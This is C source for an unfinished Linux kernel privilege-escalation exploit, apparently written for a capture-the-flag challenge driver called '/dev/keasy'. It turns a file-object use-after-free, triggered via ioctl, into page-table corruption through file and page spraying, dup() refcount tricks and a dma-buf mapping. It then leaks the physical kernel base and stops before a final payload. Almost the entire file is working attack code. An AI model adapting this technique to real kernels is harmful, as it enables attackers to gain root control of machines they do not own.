#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <linux/dma-heap.h>

#define N_PAGESPRAY 0x200
#define N_SPRAY 0x100
//#define DMA_HEAP_IOCTL_ALLOC 0xc0184800

/*
typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
  u64 len;
  u32 fd;
  u32 fd_flags;
  u64 heap_flags;
};
*/

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

int fd, dmafd, ezfd = -1;

int main() {
  struct dma_heap_allocation_data data;
  void *page_spray[N_PAGESPRAY];
  int file_spray[N_SPRAY];
  int ezfd = -1;
  pthread_t th;
  char buf[0x100] = { 0 };

  bind_core(0);

  int dummy = creat("/jail/test", 0777);
  if (dummy < 0) fatal("/jail/test");
  close(dummy);

  dmafd = creat("/dev/dma_heap/system", O_RDWR);
  if (dmafd < 0) fatal("/dev/dma_heap/system");

  // Open keasy
  fd = open("/dev/keasy", O_RDWR);
  if (fd == -1) fatal("/dev/keasy");

  // Prepare pages
  for (int i = 0; i < N_PAGESPRAY; i++) {
    page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                         0x8000, PROT_READ|PROT_WRITE,
                         MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    if (page_spray[i] == MAP_FAILED)
      fatal("mmap");
  }

  // Spray normal file objects
  puts("[+] Spraying file objects...");
  for (int i = 0; i < N_SPRAY/2; i++) {
    file_spray[i] = open("/jail/test", O_RDONLY);
    if (file_spray[i] < 0) fatal("/jail/test");
  }
  // UAF
  puts("[+] Creating dangling file object...");
  //getchar();
  ezfd = file_spray[N_SPRAY/2-1] + 1;
  if (ioctl(fd, 0, 0xdeadbeef) != -1) // fput called --> UAF
    fatal("ioctl did not fail");
  // Spray 2
  for (int i = N_SPRAY/2; i < N_SPRAY; i++) {
    file_spray[i] = open("/jail/test", O_RDONLY);
    if (file_spray[i] < 0) fatal("/jail/test");
  }

  // Free page for file cache
  puts("[+] Freeing page...");
  for (int i = 0; i < N_SPRAY; i++)
    close(file_spray[i]);

  // Page fault to allocate many PTEs
  for (int i = 0; i < N_PAGESPRAY/2; i++) {
    for (int j = 0; j < 8; j++) {
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
    }
  }
  // Allocate dma-buf
  int dma_buf_fd = -1;
  data.len = 0x1000;
  data.fd_flags = O_RDWR;
  data.heap_flags = 0;
  data.fd = 0;
  if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
    fatal("DMA_HEAP_IOCTL_ALLOC");
  printf("[+] dma_buf_fd: %d\n", dma_buf_fd = data.fd);
  printf("[+] hint: %p\n", page_spray[N_PAGESPRAY/2-1]);
  // Spray 2
  for (int i = N_PAGESPRAY/2; i < N_PAGESPRAY; i++) {
    for (int j = 0; j < 8; j++) {
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
    }
  }

  // Increment physical address
  for (int i = 0; i < 0x1000; i++)
    if (dup(ezfd) < 0)
      fatal("dup");

  // Search for victim and target virtual page
  void *target = NULL, *victim = NULL;
  for (int i = 0; i < N_PAGESPRAY; i++) {
    if (*(char*)(page_spray[i] + 7*0x1000) == 'A') {
      target = page_spray[i] + 0x7000;
      printf("[+] Found target: %p\n", target);
    }
  }
  if (target == NULL) fatal("target not found :(");

  *(char*)target = 'X';
  for (int i = 0; i < N_PAGESPRAY; i++) {
    if (*(char*)page_spray[i] == 'X') {
      victim = page_spray[i];
      printf("[+] Found victim: %p\n", victim);
    }
  }
  if (victim == NULL) fatal("victim not found :(");

  // Remap
  puts("[+] Remapping...");
  munmap(target, 0x1000);
  void *dma = mmap(target, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
  *(char*)dma = '0';

  // Corrupt dma physaddr
  for (int i = 0; i < 0x1000; i++)
    if (dup(ezfd) < 0)
      fatal("dup");
  printf("[+] Does this look like PTE? --> 0x%016lx\n", *(size_t*)dma);

  // Resolve kernel base
  void *evil = NULL;
  *(size_t*)dma = 0x800000000009c067;
  for (int i = 0; i < N_PAGESPRAY; i++) {
    if (page_spray[i] == victim || page_spray[i] == target) continue;
    if (*(size_t*)page_spray[i] > 0xffff) {
      evil = page_spray[i];
      printf("[+] Found victim page table: %p\n", evil);
      break;
    }
  }

  size_t phys_base = ((*(size_t*)evil) & ~0xfff) - 0x1c04000;
  printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);

  // 
  size_t phys_setxattr = phys_base + 0x271730;
  

  puts("wan");
  getchar();

  getchar();

  close(fd);
  return 0;
}
